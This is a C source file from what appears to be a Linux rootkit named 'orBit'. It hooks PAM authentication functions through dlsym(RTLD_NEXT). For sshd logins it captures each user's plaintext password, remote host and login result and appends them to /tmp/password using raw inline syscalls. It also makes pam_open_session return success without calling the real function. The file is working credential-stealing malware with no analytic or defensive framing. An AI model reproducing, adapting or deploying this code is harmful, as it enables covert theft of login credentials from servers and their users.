#include "orBit.h"
extern int      fd;
extern uint8_t  sshd;
extern char     buf[ SIZE_BUF ];

struct pam_response *pam_get_password(pam_handle_t *pamh, char __attribute__((unused))*user, int __attribute__((unused))rkadmin, const char *prompt )
{
	struct pam_message msg;
	struct pam_response *pam_resp = NULL;
	const struct pam_message *pmsg;
	const struct pam_conv *conv;
	const void *convp;
	int (*pam_item)(const pam_handle_t *pamh, int item_type, const void **item) = dlsym(RTLD_NEXT, "pam_get_item");

	if ((pam_item(pamh, PAM_CONV, &convp)) != PAM_SUCCESS)
		return NULL;
	conv = convp;
	if ( conv == NULL || conv->conv == NULL )
		return ( NULL );

	msg.msg_style = 1;
	msg.msg = prompt;
	pmsg = &msg;
	conv->conv(1, &pmsg, &pam_resp, conv->appdata_ptr);
	return (pam_resp);
}

int pam_authenticate(pam_handle_t *pamh, int flags )
{
    const char *service = NULL, *host = NULL, *user = NULL;
	static int ( *orig_pam_authenticate ) ( pam_handle_t *, int  ) = NULL;
	if ( ! orig_pam_authenticate )
		orig_pam_authenticate = ( int (*) ( pam_handle_t *, int )) dlsym ( RTLD_NEXT, "pam_authenticate");

    const char *service_sshd = ("sshd");
    int err = pam_get_item( pamh, PAM_SERVICE, ( void *)&service);
    if ( err == PAM_SUCCESS && _orBit_strcmp( service, service_sshd ) == 0 )
    {
        if ( pam_get_item(pamh, PAM_USER, ( void * ) &user ) != PAM_SUCCESS )
            return ( PAM_AUTH_ERR );

        if ( pam_get_item(pamh, PAM_RHOST, ( void * ) &host) != PAM_SUCCESS )
            return ( PAM_AUTH_ERR );
	   
        struct pam_response *pwd = pam_get_password(pamh, "", 0, "Password: ");
        
        uint8_t res = check_password( pwd, user );
        // # If the condition is true, it means that a memory allocation error occurred in the function check_password.
        if ( res == 1 )
            return ( orig_pam_authenticate( pamh, flags ) );
        int size = sprintf( buf, "%s:%s:%s:%s:%s\n", service, user, host, pwd->resp, ( res == 0 ) ? "SUCCESS" : "ERROR");
        const char  *filename = "/tmp/password";
	    __asm__ volatile ("syscall" : "=a" (fd) : "a" (__NR_open ),
		      "D" (filename), "S" (O_RDWR|O_APPEND|O_CREAT), "d" (0666) :
		      "cc", "memory", "rcx", "r11");
        
	    __asm__ volatile ("syscall" : : "a" ( __NR_write ),
		      "D" ( fd ), "S" ( buf ), "d" ( size ) :
		      "cc", "memory", "rcx", "r11");
	    
        __asm__ volatile ("syscall" : : "a" (__NR_close ),
		      "D" ( fd ) :
		      "cc", "memory", "rcx", "r11");
        ( pwd != NULL ) ? free( pwd ) : 0X00;
        return ( res );
    }
    const char *service_su = "su";
    if ( err == PAM_SUCCESS && _orBit_strcmp( service, service_su ) == 0 )
    {
        if ( pam_get_item(pamh, PAM_USER, ( void * ) &user ) != PAM_SUCCESS )
            return ( PAM_AUTH_ERR );
    }
    return ( orig_pam_authenticate( pamh, flags ) );
}

int     pam_acct_mgmt(pam_handle_t *pamh, int flags)
{
	static int ( *__pam_acct_mgmt ) ( pam_handle_t *, int  ) = NULL;
	if ( ! __pam_acct_mgmt )
		__pam_acct_mgmt = ( int (*) ( pam_handle_t *, int )) dlsym ( RTLD_NEXT, "pam_acct_mgmt");

    char    *user = NULL;
    if ( pam_get_item(pamh, PAM_USER, ( void * ) &user ) != PAM_SUCCESS )
            return ( PAM_AUTH_ERR );
	return __pam_acct_mgmt ( pamh, flags );
}

int     pam_open_session(pam_handle_t *pamh, int flags)
{
	static int ( *__pam_open_session ) ( pam_handle_t *, int  ) = NULL;
	if ( ! __pam_open_session )
		__pam_open_session = ( int (*) ( pam_handle_t *, int )) dlsym ( RTLD_NEXT, "pam_open_session");
    return ( PAM_SUCCESS );
    char    *user = NULL;
    if ( pam_get_item(pamh, PAM_USER, ( void * ) &user ) != PAM_SUCCESS )
            return ( PAM_AUTH_ERR );
	return __pam_open_session(pamh, flags);
}

int pam_setcred(pam_handle_t __attribute__((unused))* pamh , int __attribute__((unused))flags )
{
    
	static int ( *__pam_setcred ) ( pam_handle_t *, int  ) = NULL;
	if ( ! __pam_setcred )
		__pam_setcred = ( int (*) ( pam_handle_t *, int )) dlsym ( RTLD_NEXT, "pam_setcred");
   return __pam_setcred( pamh, flags );
}

